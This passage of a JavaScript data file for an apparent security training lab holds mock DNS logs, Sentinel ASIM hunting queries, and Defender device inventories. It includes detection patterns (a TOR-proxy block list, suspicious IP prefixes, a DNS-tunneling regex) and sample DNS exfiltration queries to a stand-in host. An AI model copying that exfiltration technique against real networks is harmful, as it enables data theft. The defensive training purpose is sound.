  { TimeGenerated:'2026-06-29T08:02:12Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
    SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10', DnsQuery:'rkmz9xq2-pq3l.top',
    DnsQueryTypeName:'A', DnsResponseName:'' },
  { TimeGenerated:'2026-06-29T08:02:15Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
    SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10', DnsQuery:'mz9xq2pq-3lkv.top',
    DnsQueryTypeName:'A', DnsResponseName:'' },

  // TOR proxy lookups — clear policy violation indicator.
  { TimeGenerated:'2026-06-29T08:05:20Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.88', SrcHostname:'WKS-DEV-04', DstIpAddr:'10.0.0.10', DnsQuery:'tor2web.org',
    DnsQueryTypeName:'A', DnsResponseName:'185.220.101.4' },
  { TimeGenerated:'2026-06-29T08:05:25Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.88', SrcHostname:'WKS-DEV-04', DstIpAddr:'10.0.0.10', DnsQuery:'tor2web.com',
    DnsQueryTypeName:'A', DnsResponseName:'185.220.101.7' },
  { TimeGenerated:'2026-06-29T08:05:31Z', EventProduct:'Corelight Zeek', EventVendor:'Corelight', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.88', SrcHostname:'WKS-DEV-04', DstIpAddr:'10.0.0.10', DnsQuery:'torlink.co',
    DnsQueryTypeName:'A', DnsResponseName:'45.95.168.12' },
  { TimeGenerated:'2026-06-29T08:06:02Z', EventProduct:'Corelight Zeek', EventVendor:'Corelight', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
    SrcIpAddr:'10.0.4.88', SrcHostname:'WKS-DEV-04', DstIpAddr:'10.0.0.10', DnsQuery:'tor2web.io',
    DnsQueryTypeName:'A', DnsResponseName:'' },

  // Responses landing in suspicious IP prefixes — match by response_has_any_prefix.
  { TimeGenerated:'2026-06-29T08:08:14Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.55', SrcHostname:'WKS-21', DstIpAddr:'10.0.0.10', DnsQuery:'updates.legit-looking.io',
    DnsQueryTypeName:'A', DnsResponseName:'45.95.168.241' },
  { TimeGenerated:'2026-06-29T08:08:20Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.31', SrcHostname:'WKS-12', DstIpAddr:'10.0.0.10', DnsQuery:'cdn.suspicious-host.ru',
    DnsQueryTypeName:'A', DnsResponseName:'185.220.102.8' },
  { TimeGenerated:'2026-06-29T08:09:00Z', EventProduct:'Corelight Zeek', EventVendor:'Corelight', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.41', SrcHostname:'WKS-17', DstIpAddr:'10.0.0.10', DnsQuery:'api.x4z2.net',
    DnsQueryTypeName:'A', DnsResponseName:'45.95.169.5' },

  // DNS tunneling — long encoded labels under attacker-controlled zone.
  { TimeGenerated:'2026-06-29T08:11:08Z', EventProduct:'Corelight Zeek', EventVendor:'Corelight', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10',
    DnsQuery:'aGVsbG8td29ybGQtZXhmaWwtZGF0YS1ibG9iLTAwMQ.tn.exfil-host.example',
    DnsQueryTypeName:'TXT', DnsResponseName:'"ack=001"' },
  { TimeGenerated:'2026-06-29T08:11:12Z', EventProduct:'Corelight Zeek', EventVendor:'Corelight', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10',
    DnsQuery:'cG9zdC1jaHVuay0wMDItYmFzZTY0LWVuY29kZWQ.tn.exfil-host.example',
    DnsQueryTypeName:'TXT', DnsResponseName:'"ack=002"' },
  { TimeGenerated:'2026-06-29T08:11:18Z', EventProduct:'Corelight Zeek', EventVendor:'Corelight', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10',
    DnsQuery:'YzNAcjN0LWNodW5rLTAwMy1mb29iYXItYmF6.tn.exfil-host.example',
    DnsQueryTypeName:'TXT', DnsResponseName:'"ack=003"' },

  // ANY-type recon — historically used for amplification reflection.
  { TimeGenerated:'2026-06-29T08:13:01Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'198.51.100.22', SrcHostname:'(external)', DstIpAddr:'10.0.0.10', DnsQuery:'hacksmarterlabs.example',
    DnsQueryTypeName:'ANY', DnsResponseName:'(multiple)' },
  { TimeGenerated:'2026-06-29T08:13:09Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'203.0.113.41', SrcHostname:'(external)', DstIpAddr:'10.0.0.10', DnsQuery:'hacksmarterlabs.example',
    DnsQueryTypeName:'ANY', DnsResponseName:'(multiple)' },

  // Plain NXDOMAIN typos — noise that any NXDOMAIN-only rule will surface.
  { TimeGenerated:'2026-06-29T08:14:22Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
    SrcIpAddr:'10.0.4.12', SrcHostname:'WKS-01', DstIpAddr:'10.0.0.10', DnsQuery:'microsft.com',
    DnsQueryTypeName:'A', DnsResponseName:'' },
  { TimeGenerated:'2026-06-29T08:14:48Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
    SrcIpAddr:'10.0.4.41', SrcHostname:'WKS-17', DstIpAddr:'10.0.0.10', DnsQuery:'githunb.com',
    DnsQueryTypeName:'A', DnsResponseName:'' },

  // Internal lookups — confirm parser handles TXT/MX too.
  { TimeGenerated:'2026-06-29T08:16:10Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.0.5', SrcHostname:'MAIL-01', DstIpAddr:'10.0.0.10', DnsQuery:'corp.hacksmarterlabs.example',
    DnsQueryTypeName:'MX', DnsResponseName:'mail-01.corp.hacksmarterlabs.example' },
  { TimeGenerated:'2026-06-29T08:16:42Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.0.5', SrcHostname:'MAIL-01', DstIpAddr:'10.0.0.10', DnsQuery:'_dmarc.hacksmarterlabs.example',
    DnsQueryTypeName:'TXT', DnsResponseName:'"v=DMARC1; p=reject; rua=mailto:dmarc@hacksmarterlabs.example"' },
];

const ASIM_DNS_SAVED_QUERIES = [
  {
    name:'Failed lookups (NXDOMAIN) — last day',
    description:'Canonical ASIM example. Surfaces typos, dead domains, and DGA bursts. Pivot on SrcHostname to find beaconing.',
    expectedRows:9,
    query:`_Im_Dns(responsecodename='NXDOMAIN', starttime=ago(1d), endtime=now())\n| project TimeGenerated, SrcHostname, SrcIpAddr, DnsQuery, DnsQueryTypeName, EventResultDetails`,
  },
  {
    name:'Lookups to TOR proxy domains',
    description:"Block-list pattern. ASIM's domain_has_any takes a dynamic list — works against any normalized source.",
    expectedRows:4,
    query:`let torProxies=dynamic(["tor2web.org","tor2web.com","torlink.co","tor2web.io"]);\n_Im_Dns(domain_has_any=torProxies)\n| project TimeGenerated, SrcHostname, DnsQuery, DnsResponseName, EventResultDetails`,
  },
  {
    name:'Responses pointing at known-bad prefixes',
    description:'response_has_any_prefix filters on the DnsResponseName. Prefixes end with a dot.',
    expectedRows:6,
    query:`_Im_Dns(response_has_any_prefix=dynamic(["185.220.","45.95."]))\n| project TimeGenerated, SrcHostname, DnsQuery, DnsResponseName`,
  },
  {
    name:'ANY-type queries (amplification recon)',
    description:'DnsQueryTypeName == "ANY" from external sources is a recon / amplification signal.',
    expectedRows:2,
    query:`_Im_Dns()\n| where DnsQueryTypeName == "ANY"\n| project TimeGenerated, SrcIpAddr, DnsQuery, DnsQueryTypeName`,
  },
  {
    name:'Long DNS labels (tunneling)',
    description:'Subdomain labels over 40 chars are a classic DNS exfiltration signal.',
    expectedRows:3,
    query:`_Im_Dns()\n| where DnsQuery matches regex "^[A-Za-z0-9-]{30,}\\."\n| project TimeGenerated, SrcHostname, DnsQuery, DnsQueryTypeName`,
  },
];

const ASIM_DNS_NOTES = [
  { title:'Unifying parser', detail:'_Im_Dns calls every source-specific parser (vimDnsHackSmarterLabsOMS, vimDnsCorelightZeek, …) and returns a single normalized result set. Always prefer it over a raw table name.' },
  { title:'Filter pushdown', detail:'Pass time and IP filters as parameters (starttime, srcipaddr, domain_has_any) — they push down to each source parser instead of running after the union, dramatically improving performance.' },
  { title:'Response duplication', detail:"DNS uses UDP, so request and response segments aren't linked. Most teams only log the client-facing response. Filter EventSubType == 'response' if you ingest multiple segments." },
  { title:'Schema version', detail:'Current ASIM DNS schema is 0.1.7. EventSchemaVersion stays pinned on the rows so downstream content can branch on it.' },
];

// ---------- Defender for Endpoint device inventory + timeline ----------
const DEVICES = [
  { avStatus:'Up to date', excluded:false, winVersion:'—', id:'WKS-03', name:'WKS-03', domain:'hacksmarterlabs.example', os:'Windows 11 Enterprise 23H2',
    riskLevel:'High', exposureLevel:'High', healthStatus:'Active', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2025-11-08T12:14:00Z', lastSeen:'2026-06-28T15:02:11Z',
    primaryUser:'jdoe@hacksmarterlabs.example', ip:'10.20.7.42', tags:['Sales','Win11'], openAlerts:2,
    isInternetFacing:true, recommendationCount:3, installedSoftware:42, discoveredVulnerabilities:2 },
  { avStatus:'Up to date', excluded:false, winVersion:'—', id:'FIN-FS-02', name:'FIN-FS-02', domain:'hacksmarterlabs.example', os:'Windows Server 2022',
    riskLevel:'High', exposureLevel:'Medium', healthStatus:'Active', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2024-02-04T09:00:00Z', lastSeen:'2026-06-28T10:22:00Z',
    primaryUser:'fin-svc@hacksmarterlabs.example', ip:'10.20.3.14', tags:['Finance','FileServer'], openAlerts:2,
    isInternetFacing:false, recommendationCount:5, installedSoftware:64, discoveredVulnerabilities:4 },
  { avStatus:'Up to date', excluded:false, winVersion:'—', id:'WKS-01', name:'WKS-01', domain:'hacksmarterlabs.example', os:'Windows 11 Enterprise 23H2',
    riskLevel:'Medium', exposureLevel:'Medium', healthStatus:'Active', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2025-06-22T08:00:00Z', lastSeen:'2026-06-28T14:01:00Z',
    primaryUser:'svc-scan@hacksmarterlabs.example', ip:'10.20.7.10', tags:['IT','Win11'], openAlerts:1,
    isInternetFacing:false, recommendationCount:2, installedSoftware:39, discoveredVulnerabilities:1 },
  { avStatus:'Not updated', excluded:false, winVersion:'—', id:'WKS-02', name:'WKS-02', domain:'hacksmarterlabs.example', os:'Windows 11 Enterprise 23H2',
    riskLevel:'Medium', exposureLevel:'Low',    healthStatus:'Active', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2025-06-22T08:01:00Z', lastSeen:'2026-06-28T14:16:00Z',
    primaryUser:'svc-scan@hacksmarterlabs.example', ip:'10.20.7.11', tags:['IT','Win11'], openAlerts:1,
    isInternetFacing:false, recommendationCount:1, installedSoftware:37, discoveredVulnerabilities:1 },
  { avStatus:'Up to date', excluded:true, winVersion:'—', id:'DC01', name:'DC01', domain:'hacksmarterlabs.example', os:'Windows Server 2022 (Domain Controller)',
    riskLevel:'High', exposureLevel:'Low',    healthStatus:'Active', onboardingStatus:'Onboarded',
    sensor:'Defender for Identity + Defender for Endpoint',
    firstSeen:'2023-09-12T00:00:00Z', lastSeen:'2026-06-28T15:00:00Z',
    primaryUser:'(machine account)', ip:'10.20.0.10', tags:['Tier-0','DC'], openAlerts:2,
    isInternetFacing:false, recommendationCount:4, installedSoftware:31, discoveredVulnerabilities:3 },

  // --- Windows 10 fleet: spans every health / antivirus / exclusion / version
  // bucket the inventory filter offers, so each facet returns real rows. ---
  { avStatus:'Up to date', excluded:false, winVersion:'22H2',
    id:'W10-SALES-11', name:'W10-SALES-11', domain:'hacksmarterlabs.example', os:'Windows 10 Enterprise 22H2',
    riskLevel:'Low', exposureLevel:'Low', healthStatus:'Active', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2025-02-10T08:00:00Z', lastSeen:'2026-06-28T14:30:00Z',
    primaryUser:'mrivera@hacksmarterlabs.example', ip:'10.20.7.51', tags:['Sales','Win10'], openAlerts:0,
    isInternetFacing:false, recommendationCount:1, installedSoftware:35, discoveredVulnerabilities:0 },
  { avStatus:'Not updated', excluded:false, winVersion:'21H2',
    id:'W10-SALES-12', name:'W10-SALES-12', domain:'hacksmarterlabs.example', os:'Windows 10 Enterprise 21H2',
    riskLevel:'Medium', exposureLevel:'Medium', healthStatus:'Misconfigured', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2025-02-10T08:05:00Z', lastSeen:'2026-06-28T13:10:00Z',
    primaryUser:'tchen@hacksmarterlabs.example', ip:'10.20.7.52', tags:['Sales','Win10'], openAlerts:0,
    isInternetFacing:false, recommendationCount:4, installedSoftware:36, discoveredVulnerabilities:2 },
  { avStatus:'Disabled', excluded:false, winVersion:'21H1',
    id:'W10-ENG-04', name:'W10-ENG-04', domain:'hacksmarterlabs.example', os:'Windows 10 Pro 21H1',
    riskLevel:'High', exposureLevel:'High', healthStatus:'Misconfigured', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2024-09-01T08:00:00Z', lastSeen:'2026-06-28T11:45:00Z',
    primaryUser:'dpatel@hacksmarterlabs.example', ip:'10.20.8.14', tags:['Engineering','Win10'], openAlerts:1,
    isInternetFacing:false, recommendationCount:8, installedSoftware:58, discoveredVulnerabilities:6 },
  { avStatus:'Unknown', excluded:false, winVersion:'20H2',
    id:'W10-ENG-05', name:'W10-ENG-05', domain:'hacksmarterlabs.example', os:'Windows 10 Pro 20H2',
    riskLevel:'Medium', exposureLevel:'Medium', healthStatus:'Inactive', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2024-09-01T08:02:00Z', lastSeen:'2026-05-30T09:12:00Z',
    primaryUser:'dpatel@hacksmarterlabs.example', ip:'10.20.8.15', tags:['Engineering','Win10'], openAlerts:0,
    isInternetFacing:false, recommendationCount:5, installedSoftware:54, discoveredVulnerabilities:4 },
  { avStatus:'Unknown', excluded:false, winVersion:'2004',
    id:'W10-LAB-02', name:'W10-LAB-02', domain:'hacksmarterlabs.example', os:'Windows 10 Enterprise 2004',
    riskLevel:'Medium', exposureLevel:'Low', healthStatus:'Inactive', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2023-06-14T08:00:00Z', lastSeen:'2026-04-02T16:40:00Z',
    primaryUser:'svc-lab@hacksmarterlabs.example', ip:'10.20.11.22', tags:['Lab','Win10'], openAlerts:0,
    isInternetFacing:false, recommendationCount:6, installedSoftware:28, discoveredVulnerabilities:5 },
  { avStatus:'Not updated', excluded:true, winVersion:'1909',
    id:'W10-KIOSK-01', name:'W10-KIOSK-01', domain:'hacksmarterlabs.example', os:'Windows 10 Enterprise LTSC 1909',
    riskLevel:'Medium', exposureLevel:'Medium', healthStatus:'Active', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2023-03-20T08:00:00Z', lastSeen:'2026-06-28T07:55:00Z',
    primaryUser:'(kiosk account)', ip:'10.20.13.9', tags:['Kiosk','Win10','Excluded'], openAlerts:0,
    isInternetFacing:false, recommendationCount:3, installedSoftware:12, discoveredVulnerabilities:3 },
  { avStatus:'Disabled', excluded:true, winVersion:'1903',
    id:'W10-OT-BRIDGE', name:'W10-OT-BRIDGE', domain:'hacksmarterlabs.example', os:'Windows 10 IoT Enterprise 1903',
    riskLevel:'High', exposureLevel:'High', healthStatus:'Misconfigured', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2023-01-11T08:00:00Z', lastSeen:'2026-06-28T08:20:00Z',
    primaryUser:'(machine account)', ip:'10.20.6.40', tags:['OT','Win10','Excluded'], openAlerts:1,
    isInternetFacing:false, recommendationCount:9, installedSoftware:19, discoveredVulnerabilities:7 },
  { avStatus:'Unknown', excluded:false, winVersion:'1809',
    id:'W10-LEGACY-07', name:'W10-LEGACY-07', domain:'hacksmarterlabs.example', os:'Windows 10 Enterprise LTSC 1809',
    riskLevel:'High', exposureLevel:'Medium', healthStatus:'Inactive', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2022-08-05T08:00:00Z', lastSeen:'2026-03-18T10:00:00Z',
    primaryUser:'mfoster@hacksmarterlabs.example', ip:'10.20.11.31', tags:['Legacy','Win10'], openAlerts:0,
    isInternetFacing:false, recommendationCount:11, installedSoftware:24, discoveredVulnerabilities:9 },
  { avStatus:'Disabled', excluded:false, winVersion:'1803',
    id:'W10-LEGACY-08', name:'W10-LEGACY-08', domain:'hacksmarterlabs.example', os:'Windows 10 Pro 1803',
    riskLevel:'High', exposureLevel:'High', healthStatus:'Misconfigured', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2022-08-05T08:04:00Z', lastSeen:'2026-06-27T21:30:00Z',
    primaryUser:'mfoster@hacksmarterlabs.example', ip:'10.20.11.32', tags:['Legacy','Win10'], openAlerts:1,
    isInternetFacing:false, recommendationCount:13, installedSoftware:26, discoveredVulnerabilities:11 },
  { avStatus:'Unknown', excluded:false, winVersion:'1709',
    id:'W10-LEGACY-09', name:'W10-LEGACY-09', domain:'hacksmarterlabs.example', os:'Windows 10 Pro 1709',
    riskLevel:'High', exposureLevel:'Medium', healthStatus:'Inactive', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2022-02-19T08:00:00Z', lastSeen:'2026-01-09T13:05:00Z',
    primaryUser:'(unassigned)', ip:'10.20.11.33', tags:['Legacy','Win10'], openAlerts:0,
    isInternetFacing:false, recommendationCount:14, installedSoftware:22, discoveredVulnerabilities:12 },
  { avStatus:'Unknown', excluded:false, winVersion:'1703',
    id:'W10-LEGACY-10', name:'W10-LEGACY-10', domain:'hacksmarterlabs.example', os:'Windows 10 Pro 1703',
    riskLevel:'High', exposureLevel:'Medium', healthStatus:'Inactive', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2021-11-30T08:00:00Z', lastSeen:'2025-12-02T09:41:00Z',
    primaryUser:'(unassigned)', ip:'10.20.11.34', tags:['Legacy','Win10'], openAlerts:0,
    isInternetFacing:false, recommendationCount:15, installedSoftware:21, discoveredVulnerabilities:13 },
  { avStatus:'Disabled', excluded:false, winVersion:'1607',
    id:'W10-LEGACY-11', name:'W10-LEGACY-11', domain:'hacksmarterlabs.example', os:'Windows 10 Enterprise LTSB 1607',
    riskLevel:'High', exposureLevel:'High', healthStatus:'Inactive', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2021-05-04T08:00:00Z', lastSeen:'2025-10-14T11:22:00Z',
    primaryUser:'(unassigned)', ip:'10.20.11.35', tags:['Legacy','Win10'], openAlerts:0,
    isInternetFacing:false, recommendationCount:17, installedSoftware:18, discoveredVulnerabilities:15 },
  { avStatus:'Up to date', excluded:false, winVersion:'Future',
    id:'W10-INSIDER-01', name:'W10-INSIDER-01', domain:'hacksmarterlabs.example', os:'Windows 10 Enterprise Insider Preview',
    riskLevel:'Low', exposureLevel:'Low', healthStatus:'Active', onboardingStatus:'Onboarded',
    sensor:'Defender for Endpoint', firstSeen:'2026-05-20T08:00:00Z', lastSeen:'2026-06-28T14:50:00Z',
    primaryUser:'itlab@hacksmarterlabs.example', ip:'10.20.11.40', tags:['IT','Insider'], openAlerts:0,
    isInternetFacing:false, recommendationCount:1, installedSoftware:33, discoveredVulnerabilities:0 },
];

// ---------- Device discovery (unmanaged assets seen by onboarded sensors) ----------
// Onboarded devices act as sensors: passive traffic analysis (basic) plus active
// probing (standard) surfaces endpoints, network gear, and IoT that no agent covers.
// `tab` maps a device to a device-inventory tab; `onboardingStatus` drives the
// "can this be protected?" triage the learner practices here.
const DISCOVERED_DEVICES = [
  // --- Computers & Mobile ---
  { id:'DD-001', name:'LAB-VM-07', tab:'computers', type:'Workstation', os:'Windows 10 Pro 22H2',
    ip:'10.20.7.88', mac:'00-15-5D-3A-11-04', vendor:'Hack Smarter Labs', network:'CORP-LAN',
    onboardingStatus:'Can be onboarded', discoverySource:'Standard', riskLevel:'Medium',
    firstSeen:'2026-05-02T09:12:00Z', lastSeen:'2026-06-28T14:40:00Z', highValue:false,
    protocols:['ARP','SMB','WinRM','LLMNR'], seenBy:['WKS-01','WKS-02'], recommendationCount:4,
    note:'Unmanaged bench VM. Same subnet as onboarded sales workstations.' },
  { id:'DD-002', name:'CONTRACTOR-LT1', tab:'computers', type:'Workstation', os:'Windows 11 Home',
    ip:'10.20.7.140', mac:'A4-83-E7-9C-22-1B', vendor:'Dell Inc.', network:'CORP-LAN',
    onboardingStatus:'Can be onboarded', discoverySource:'Standard', riskLevel:'High',
    firstSeen:'2026-06-24T08:31:00Z', lastSeen:'2026-06-28T15:01:00Z', highValue:false,
    protocols:['ARP','DHCP','SMB','HTTP'], seenBy:['WKS-03'], recommendationCount:7,
    note:'Personal device on corporate LAN. Shadow IT — no sensor, no policy.' },
  { id:'DD-003', name:'BUILD-SRV-09', tab:'computers', type:'Server', os:'Ubuntu Server 22.04 LTS',
    ip:'10.20.3.51', mac:'52-54-00-B7-4E-A9', vendor:'QEMU/KVM', network:'CORP-LAN',
    onboardingStatus:'Can be onboarded', discoverySource:'Standard', riskLevel:'High',
    firstSeen:'2026-01-14T10:00:00Z', lastSeen:'2026-06-28T13:55:00Z', highValue:true,
    protocols:['SSH','HTTP','ICMP','ARP'], seenBy:['FIN-FS-02'], recommendationCount:9,
    note:'Exposed SSH. High-value: holds build artifacts signed for production.' },
  { id:'DD-004', name:'ESXI-HOST-02', tab:'computers', type:'Server', os:'VMware ESXi 7.0',
    ip:'10.20.3.8', mac:'00-50-56-A1-33-7C', vendor:'VMware, Inc.', network:'CORP-LAN',
    onboardingStatus:'Unsupported', discoverySource:'Standard', riskLevel:'Medium',
    firstSeen:'2024-11-02T00:00:00Z', lastSeen:'2026-06-28T15:00:00Z', highValue:true,
    protocols:['HTTPS','SSH','SLP'], seenBy:['FIN-FS-02','DC01'], recommendationCount:3,
    note:'Hypervisor — no Defender for Endpoint sensor exists for this platform.' },
  { id:'DD-005', name:'ANDROID-8F2C', tab:'computers', type:'Mobile', os:'Android 14',
    ip:'10.20.9.31', mac:'C8-3D-D4-7E-90-52', vendor:'Samsung Electronics', network:'CORP-WIFI',
    onboardingStatus:'Can be onboarded', discoverySource:'Basic', riskLevel:'Low',
    firstSeen:'2026-06-11T07:45:00Z', lastSeen:'2026-06-28T12:10:00Z', highValue:false,
    protocols:['DHCP','mDNS','ARP'], seenBy:['WKS-01'], recommendationCount:1,
    note:'BYOD handset. Onboardable via Defender for Endpoint mobile app.' },
  { id:'DD-006', name:'10.20.9.77', tab:'computers', type:'Unknown', os:'Unknown',
    ip:'10.20.9.77', mac:'2E-91-A0-45-C3-08', vendor:'(locally administered)', network:'CORP-WIFI',
    onboardingStatus:'Insufficient info', discoverySource:'Basic', riskLevel:'Informational',
    firstSeen:'2026-06-27T19:02:00Z', lastSeen:'2026-06-27T19:44:00Z', highValue:false,
    protocols:['ARP'], seenBy:['WKS-02'], recommendationCount:0,
    note:'Randomized MAC, brief appearance. Too little traffic to classify.' },
  { id:'DD-007', name:'MAC-DESIGN-04', tab:'computers', type:'Workstation', os:'macOS 14 Sonoma',
    ip:'10.20.7.161', mac:'F0-18-98-2D-6B-77', vendor:'Apple, Inc.', network:'CORP-LAN',
    onboardingStatus:'Can be onboarded', discoverySource:'Standard', riskLevel:'Low',
    firstSeen:'2026-03-19T09:00:00Z', lastSeen:'2026-06-28T11:20:00Z', highValue:false,
    protocols:['mDNS','AFP','SSH','ARP'], seenBy:['WKS-03'], recommendationCount:2,
    note:'Design team Mac. Sensor available for macOS — onboard to close the gap.' },

  // --- Network devices (authenticated SNMP scans) ---
  { id:'DD-101', name:'CORE-SW-01', tab:'network', type:'Switch', os:'Cisco IOS 15.2',
    ip:'10.20.0.2', mac:'00-1B-0D-63-C2-C0', vendor:'Cisco Systems', network:'CORP-LAN',
    onboardingStatus:'Unsupported', discoverySource:'Authenticated scan', riskLevel:'Medium',
    firstSeen:'2023-08-01T00:00:00Z', lastSeen:'2026-06-28T14:00:00Z', highValue:true,
    protocols:['SNMP','CDP','LLDP'], seenBy:['DC01'], recommendationCount:5,
    note:'Core switch. Assessed by SNMP read-only scan from DC01 (scanner role).' },
  { id:'DD-102', name:'EDGE-FW-01', tab:'network', type:'Firewall', os:'FortiOS 7.2',
    ip:'10.20.0.1', mac:'00-09-0F-11-88-30', vendor:'Fortinet', network:'CORP-LAN',
    onboardingStatus:'Unsupported', discoverySource:'Authenticated scan', riskLevel:'High',
    firstSeen:'2023-08-01T00:00:00Z', lastSeen:'2026-06-28T14:00:00Z', highValue:true,
    protocols:['SNMP','HTTPS','SSH'], seenBy:['DC01'], recommendationCount:6,
    note:'Perimeter firewall running firmware with known CVEs. Patch via network team.' },
  { id:'DD-103', name:'WLC-01', tab:'network', type:'WLAN controller', os:'Cisco AireOS 8.10',
    ip:'10.20.0.6', mac:'00-1B-0D-A4-19-70', vendor:'Cisco Systems', network:'CORP-LAN',
    onboardingStatus:'Unsupported', discoverySource:'Authenticated scan', riskLevel:'Low',
    firstSeen:'2024-02-11T00:00:00Z', lastSeen:'2026-06-28T13:30:00Z', highValue:false,
    protocols:['SNMP','CDP'], seenBy:['DC01'], recommendationCount:2,
    note:'Wireless controller for CORP-WIFI.' },
  { id:'DD-104', name:'BRANCH-RTR-03', tab:'network', type:'Router', os:'MikroTik RouterOS 6.48',
    ip:'10.20.12.1', mac:'DC-2C-6E-55-01-9A', vendor:'MikroTik', network:'BRANCH-LAN',
    onboardingStatus:'Unsupported', discoverySource:'Standard', riskLevel:'High',
    firstSeen:'2025-09-30T00:00:00Z', lastSeen:'2026-06-28T09:12:00Z', highValue:false,
    protocols:['MNDP','SNMP','Telnet'], seenBy:['WKS-02'], recommendationCount:4,
    note:'Telnet reachable and firmware is years behind. Not yet under authenticated scan.' },

  // --- IoT / OT (requires Defender for IoT in the portal) ---
  { id:'DD-201', name:'PRN-FIN-02', tab:'iot', type:'Printer', os:'HP FutureSmart 4',
    ip:'10.20.5.20', mac:'3C-52-82-90-1E-44', vendor:'HP Inc.', network:'CORP-LAN',
    onboardingStatus:'Unsupported', discoverySource:'Standard', riskLevel:'Medium',
    firstSeen:'2024-05-06T00:00:00Z', lastSeen:'2026-06-28T14:44:00Z', highValue:false,
    protocols:['IPP','PJL','SNMP','mDNS'], seenBy:['FIN-FS-02'], recommendationCount:3,
    note:'Finance floor printer. Default admin page reachable over HTTP.' },
  { id:'DD-202', name:'CAM-LOBBY-01', tab:'iot', type:'Camera', os:'Axis OS 10.12',
    ip:'10.20.5.61', mac:'AC-CC-8E-71-3B-02', vendor:'Axis Communications', network:'CORP-LAN',
    onboardingStatus:'Unsupported', discoverySource:'Standard', riskLevel:'High',
    firstSeen:'2024-05-06T00:00:00Z', lastSeen:'2026-06-28T15:02:00Z', highValue:false,
    protocols:['RTSP','HTTP','SSDP','ARP'], seenBy:['WKS-03'], recommendationCount:5,
    note:'Camera with a vendor default credential recommendation open against it.' },
  { id:'DD-203', name:'CONF-DISPLAY-3', tab:'iot', type:'Audio and Video', os:'Embedded Linux',
